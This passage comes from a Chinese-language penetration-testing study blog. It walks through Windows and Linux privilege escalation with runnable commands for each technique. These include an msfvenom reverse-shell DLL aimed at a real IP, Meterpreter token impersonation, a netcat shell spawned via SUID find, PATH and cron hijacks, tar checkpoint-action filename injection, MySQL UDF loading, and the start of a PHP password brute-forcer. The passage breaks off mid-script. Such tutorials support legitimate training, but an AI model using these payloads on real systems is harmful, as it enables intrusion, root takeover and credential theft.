./potato.exe</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="注意的点"><a class="markdownIt-Anchor" href="#注意的点"></a> 注意的点</h4><ol><li>单纯令牌窃取是在一定的权限下才能实施成功的，需要有枚举system令牌的权限。</li><li>如果是普通权限，则使用烂土豆可以将令牌进行模拟，再使用令牌窃取完成攻击</li></ol><h3 id="dll劫持提权应用配合msfweb权限"><a class="markdownIt-Anchor" href="#dll劫持提权应用配合msfweb权限"></a> DLL劫持提权应用配合MSF——web权限</h3><p>Windows程序启动的时候需要DLL库进行支持。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><ul><li>1、应用程序加载的目录</li><li>2、C:\Windows\System32</li><li>3、C:\Windows\System</li><li>4、C:\Windows</li><li>5、当前工作目录 Current Working Directory，CWD</li><li>6、在 PATH 环境变量的目录（先系统后用户）</li></ul><p>CS中的使用Juicypotato提取，是使用DLL注入的方式执行Juicypotato实现权限提升，但是缺陷比较明显，只能使用默认的CLSID({4991d34b-80a1-4291-83b6-3328366b9097})进行提权,如果想使用其他CLSID请参考命令行等执行方法</p><h4 id="dll劫持提权流程"><a class="markdownIt-Anchor" href="#dll劫持提权流程"></a> DLL劫持提权流程</h4><p><strong>信息收集----------&gt;进程调试----------&gt;制作 dll 并上传----------&gt;替换 dll----------&gt;启动应用后成功</strong></p><ul><li><p>信息收集：服务器上有的第三方软件</p><p>一般看有什么程序的文件夹</p></li><li><p>进程调试：程序运行的事=时候调用了那些dll（火绒剑可以看）</p><p>一般一些写在system的dll是改不了的，所以看存在程序同名目录下的dll文件。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625095218724.png" alt="image-20230625095218724" style="zoom:80%;" /></li></ul><ul><li><p>找到该dll，用msf生成木马进行替换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp</span><br><span class="line">lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/xiaodi.dll</span><br></pre></td></tr></table></figure></li><li><p>MSF启动监听，然后配合令牌窃取成功提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure></li></ul><h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h4><ul><li>dll劫持提权需要<strong>特定软件应用的控制权限及启用配合</strong>，复杂鸡肋</li><li>AlwaysInstallElevated提权默认禁用配置，利用成功机会很少</li></ul><h3 id="不带引号服务路径配合msf"><a class="markdownIt-Anchor" href="#不带引号服务路径配合msf"></a> 不带引号服务路径配合MSF</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完 整路径，则系统会按字面解释它并执行，像这样。</p><p>带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100010606.png" alt="image-20230625100010606" style="zoom:67%;" /><p>不带引号：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100053640.png" alt="image-20230625100053640" style="zoom:67%;" /><p>不带引号而且不安全的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100611727.png" alt="image-20230625100611727" style="zoom: 67%;" /><p>一旦我们使用了不带引号的方式执行命令，且命令中路径包含空格，将会出现这种情况：</p><p>首先是正常的（我直接拖进来的程序）：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100313042.png" alt="image-20230625100313042" style="zoom:50%;" /><p>不正常的：</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625100425455.png" alt="image-20230625100425455" style="zoom:67%;" /><p>因为有空格，那么后面的字符串就被认为是参数，传入到Program这个“程序”中，然而，没有这个程序。如果我们自己伪造一个Program程序，那么即可执行！</p><h4 id="流程"><a class="markdownIt-Anchor" href="#流程"></a> 流程</h4><ol><li><p>使用msf制作一个后门，命名为Program.exe，上传到目标服务器C盘根目录</p></li><li><p>启动服务/重启。</p><p>启动服务。可以在webshell中或者本地启动服务。但是测试时，webshell中启动不了，所以不带引号服务路径提权方法还是多用于本地提权。</p><p>重启啥的，可以使用ddos攻击</p></li></ol><h3 id="不安全服务权限配合msf本地权限"><a class="markdownIt-Anchor" href="#不安全服务权限配合msf本地权限"></a> 不安全服务权限配合MSF——本地权限</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限。例如，可以直接修改它导致重定向执行文件。这样我们可以达到这样的效果：</p><ol><li><strong>修改服务项中的运行地址，将之从安全的，带引号的服务路径，变成不带引号的。</strong></li><li><strong>改成我们自己的木马地址</strong></li></ol><h4 id="流程-2"><a class="markdownIt-Anchor" href="#流程-2"></a> 流程</h4><p><strong>检测服务权限配置----------&gt;制作文件并上传----------&gt;更改服务路径指向----------&gt;调用后成功</strong></p><ol><li><p>检测服务权限配置</p><p>使用<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">accessChk</a>这个命令，他是官方的，所以不会被杀掉。执行命令，检测当前用户所在组的服务权限（实战中一般都不是administrators组，这里仅做测试用），列出的都是当前用户可以操作的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;administrators&quot; *</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101243436.png" alt="image-20230625101243436" style="zoom:50%;" /></li><li><p>制作木马并上传</p></li><li><p>看到有哪些可以更改的服务，那就到该服务下，改其地址！</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101309992.png" alt="image-20230625101309992" style="zoom:50%;" /><p>执行命令更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config &quot;NewServiceName&quot; binpath=&quot;C:\Program.exe&quot;</span><br></pre></td></tr></table></figure><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101404246.png" alt="image-20230625101404246" style="zoom: 50%;" /></li><li><p>启动服务</p></li></ol><h2 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h2><p>与windows一样，也是有web和本地提权之分</p><h3 id="用户权限"><a class="markdownIt-Anchor" href="#用户权限"></a> 用户权限</h3><p>使用id查看：超过1000是普通用户</p><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><p>包括：内核信息（<code>cat /proc/version</code>，<code>uname -a</code>）、用户群组（<code>id</code>，<code>who</code>，<code>cat /etc/group</code>）、环境信息（环境变量中可能存在密码或API密钥<code>cat /etc/profile</code>，<code>/etc/bashrc</code>）、进程服务、计划任务、有无ssh私钥（<code>cat ~/.ssh/authorized_keys</code>）、有无明文密码（配置文件，config之类的）、可读写执行目录。</p><p>自动化搜集：</p><ol><li>信息：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a>（<code>./LinEnum.sh</code>），<a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker</a>（<code>python2 linuxprivchecker.py -w -o linuxprivchecker.log</code>）</li><li>漏洞：<a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a></li></ol><p>信息搜集有助于下一步的攻击、采取什么payload与攻击路线。</p><p>而LinEnum主要检测的，除了上述，就是一些特权访问的文件、作业、任务、一些web的版本信息等</p><h3 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h3><p>**SUID（set user id）是一种授予文件的权限类型，允许用户以其所有者的权限执行文件。**例如，ping实用程序需要root权限才能打开网络套接字，但它也需要由标准用户执行，以验证与其他主机的连接。通过将ping程序标记为SUID（所有者为root），只要标准用户执行ping程序，便会以root特权 执行ping。</p><p>但是如果某些现有的二进制文件和实用程序具有SUID权限，则可以使用它们将权限升级到root，我们可以使用它来提升我们的特权。</p><blockquote><p>之前遇到的：两个指令，一个是<code>cp</code>，一个是<code>unzip</code>，使用第一个指令，复制一个文件，那么我们就可以用自己的权限打开root才能打开的文件，第二个也是。</p></blockquote><p>允许权限提升的已知Linux可执行文件包括：</p><blockquote><p>Nmap / Vim / find / Bash / mv / More / Less / Nano / cp</p></blockquote><h4 id="流程-3"><a class="markdownIt-Anchor" href="#流程-3"></a> 流程</h4><ol><li><p>查找SUID可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>他们的特征是：有个s在他们的权限中，就是以super权限执行的程序（针对可执行文件或目录，使文件在执行阶段，<strong>临时拥有文件所有者的权限</strong>）。而且他们own by root。</p><blockquote><p>如果是使用<code>chomod u+s ???</code>那就是SUID</p></blockquote><p>利用方式参考：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p></li><li><p>特定SUID利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch xiaodi</span><br><span class="line">find xiaodi -exec whoami \;</span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line"></span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure></li></ol><h3 id="内核漏洞提权"><a class="markdownIt-Anchor" href="#内核漏洞提权"></a> 内核漏洞提权</h3><p>上传并使用脚本：<a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a>来看看有哪些漏洞。然后上github找对应的exp。</p><h3 id="webshell权限与脏牛提权"><a class="markdownIt-Anchor" href="#webshell权限与脏牛提权"></a> webshell权限与脏牛提权</h3><h4 id="漏洞范围"><a class="markdownIt-Anchor" href="#漏洞范围"></a> 漏洞范围：</h4><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><h4 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害：</h4><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p><h4 id="简要分析"><a class="markdownIt-Anchor" href="#简要分析"></a> 简要分析：</h4><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p><p>参考：<a href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p><h4 id="流程-4"><a class="markdownIt-Anchor" href="#流程-4"></a> 流程</h4><p>找到攻击点，得到webshell，搜集信息，上传exp，然后编译运行：</p><p>exp:<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a>   <a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /root/dcow.cpp /tmp</span><br><span class="line">shell</span><br><span class="line">ls </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><h3 id="环境变量提权配合suid"><a class="markdownIt-Anchor" href="#环境变量提权配合suid"></a> 环境变量提权（配合SUID）</h3><h4 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识"></a> 背景知识</h4><p>使用echo命令显示当前PATH环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure><p>如果你在PATH变量中看到 《<strong>.</strong>》，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。</p><p>参考：<a href="https://blog.csdn.net/qq_50854790/article/details/120941341">https://blog.csdn.net/qq_50854790/article/details/120941341</a></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p><strong>前提</strong>：</p><ul><li>配合 SUID 进行环境变量提权</li><li>本地用户权限</li></ul><p><strong>流程</strong>：手写调用文件+编译+复制文件+增加环境变量+执行触发</p><ol><li><p><strong>手写调用文件</strong>（这一步是我们为了测试用的，如果要使用这个方法进行提权，那么应该本身就要有这个suid的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"># 或者</span><br><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><p>demo.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>复制文件</strong>：<code>cp /bin/sh /tmp/ps</code>，把<code>/bin/sh</code>复制给<code>/tmp/ps</code>，<code>ps</code>命令本来是用于显示当前进程的状态，复制后执行<code>./ps</code>就变成了执行sh命令。</p></li><li><p><strong>增加环境变量</strong>：<code>export PATH=/tmp:$PATH</code></p></li><li><p><strong>执行触发</strong>：<code>./shell</code></p></li></ol><p><strong>解释</strong>：首先我们编一个触发<code>ps</code>命令的二进制文件，当然，其他指令也行，然后将<code>/bin/sh</code>这个文件复制到一个地方，这个地方是我们可以执行文件的，例如这个地址是<code>/tmp</code>，并且重新命名为<code>ps</code>，这样，我们运行<code>/tmp/ps</code>就相当于运行<code>sh</code>，后面，我们添加环境变量，则，将<code>tmp</code>下面的二进制文件都包括进来，也就是使用<code>ps</code>将不再是原来的功能，而是执行<code>sh</code>（顺序关系），所以，当我们运行我们的二进制文件时，会调用被替换的<code>ps</code>（即<code>/tmp/ps</code>），执行<code>sh</code>。</p><p>而关于提权，因为我们编译后，这个shell文件可能会是suid的文件，也就是带有<code>s</code>权限的文件，这样我们运行就可以以root运行了。</p><h3 id="计划任务-crontab"><a class="markdownIt-Anchor" href="#计划任务-crontab"></a> 计划任务 crontab</h3><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230626093000186.png" alt="image-20230626093000186" style="zoom: 80%;" /><h4 id="路径or权限问题"><a class="markdownIt-Anchor" href="#路径or权限问题"></a> 路径or权限问题</h4><ul><li>利用计划任务指向的文件的相对路径解析问题</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>没有写绝对路径</strong>，而且是<strong>以root权限运行</strong>的。</p><p>没有写绝对路径，即默认调用<code>/usr/local/bin</code>目录下的<code>test.sh</code>脚本</p></li><li><p>看这个文件可不可写</p><ol><li><p>如果可以写（也就是权限过大），更改成可以创建shell的命令即可</p></li><li><p>如果不可以，则自己写一个与<code>test.sh</code>同名的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt;</span><br><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure><p>如果root用户执行的脚本使用具有完全访问权限的目录，则删除该文件夹并创建一个<br />符号链接文件夹到另一个服务于您控制的脚本的文件夹可能会很有用。</p></li></ol></li></ol><h4 id="命令问题"><a class="markdownIt-Anchor" href="#命令问题"></a> 命令问题</h4><ul><li>利用通配符配合命令参数自定义命令实现提权</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>里面有敏感的命令：<code>tar cvf /var/tmp/backup.tar.gz</code> <strong>，而且是</strong>以root权限运行</strong>的。</p></li><li><p>在<code>/var/tmp/</code>下创建三个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/undead/script/test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure></li><li><p>当压缩文件<code>--checkpoint-action=exec=sh test.sh</code>和文件<code>--checkpoint=1</code>时，会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh</span><br></pre></td></tr></table></figure><p>而 --checkpoint、–checkpoint-action正好是tar命令的参数，打包到这里就会导致tar命令直接把–checkpoint=1和–checkpoint-action=exec=sh test.sh两个文件名当做参数执行，而不打包文件。</p><p>–checkpoint-action=exec=sh test.sh参数的意思是执行同目录下test.sh文件，test.sh文件内容又是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp bin/bash /tmp/bash; chmod +s /tmp/bash</span><br></pre></td></tr></table></figure><p>把 bin/bash拷贝给/tmp/bash并给/tmp/bash赋SUID权限。此时我们再执行/tmp/bash就享有了suid权限，所以这里是一环套一环的</p></li><li><p>其他类似tar提权的命令还有chown、chmod、rsync</p></li></ol><p>利用条件：root执行脚本+提权的命令+有通配符<code>*</code></p><h3 id="第三方服务linux提权数据库mysql_udf"><a class="markdownIt-Anchor" href="#第三方服务linux提权数据库mysql_udf"></a> 第三方服务——Linux提权数据库MySQL_UDF</h3><p>这里只是简单介绍一下流程，首先拿到webshell之后，转移给meterpreter。具体方法可以看Raven2打靶。之后进行信息搜集。</p><ol><li><p>上传冰蝎的webshell / 上传LinEnum，查看到有Mysql服务</p></li><li><p>全局找或者自己动手找config，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到数据库的密码：R@v3nSecurity。则使用msf连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br></pre></td></tr></table></figure></li><li><p>接下来就是UDF的常规操作了，首先看版本和安装目录。版本不行则用不了UDF，安装目录不知道则导出不了UDF.so文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实施操作，下载UDF文件，编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure></li><li><p>创表，输出文件。这里我踩了个坑，我以为直接输出到<code>lib/plugin</code>，结果不是，是需要在mysql目录下的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070" /></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628125028105.png" alt="image-20230628125028105" /></p></li></ol><h3 id="linux-提权提升漏洞查找关注点-拓展总结"><a class="markdownIt-Anchor" href="#linux-提权提升漏洞查找关注点-拓展总结"></a> Linux 提权提升漏洞查找关注点-拓展总结</h3><ol><li><p>提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)</p></li><li><p>最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)</p></li><li><p>本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）</p></li><li><p>其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)</p><p>SUDO 说明参考：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a></p></li></ol><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> <a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a> <a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><h2 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h2><p>在没有办法对系统进行提权的条件下，我们可以使用数据库进行提权，但需要知道数据库提权的前提条件：</p><ul><li>服务器开启数据库服务及获取到最高权限的用户密码</li><li>除了Access数据库外，其他数据库基本存在提取的可能</li></ul><p>我们需要明确：</p><ol><li><p>数据库应用提取那在权限提升中的意义</p><p>即：我们获得webshell，但是权限很低，我们通过某种方式获得数据库权限（root），于是通过这个数据库权限提升我们的webshell权限，或者直接给我们开一个用户啥的</p></li><li><p>web或本地提权如何探针数据库应用</p></li><li><p>数据库提权权限用户名密码搜集等方法</p><ol><li><p>读取网站的配置文件（了解其命名规则以及查找技巧）</p><p>关键字：sql data inc config conn database common include</p><blockquote><p>WWW/cms/inc/conn.info.php</p><p>WWW/cms/install/source/config.ini.php</p></blockquote></li><li><p>读取数据库存储或备份文件（了解其数据库存储方式以及对应内容）</p><p>例如：mysql：<code>@@basedir/data/数据库名/表名.myd</code>存的是表中的数据，而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到</p></li><li><p>使用脚本暴力破解（<strong>了解数据库是否支持外联</strong>以及如何开启外联）</p><p>外联：只支持本机连接本机，不允许外部连接。如果不支持，那就上传脚本，如果支持，那就在自己电脑上运行。以下脚本保存在web服务器中，我们访问即可。</p><p><strong>不支持外联</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;cent一下er&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;Mysql账号密码在线爆破工具 V2.0&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> if(@$_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">   $host = @$_POST[&#x27;host&#x27;];</span><br><span class="line">   if($host!==&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">$password = array();</span><br><span class="line">$filename = &quot;pwd.txt&quot;; //同目录下密码字典</span><br><span class="line">$i=0;</span><br><span class="line">$file = fopen($filename,&#x27;r&#x27;);</span><br><span class="line">while(! 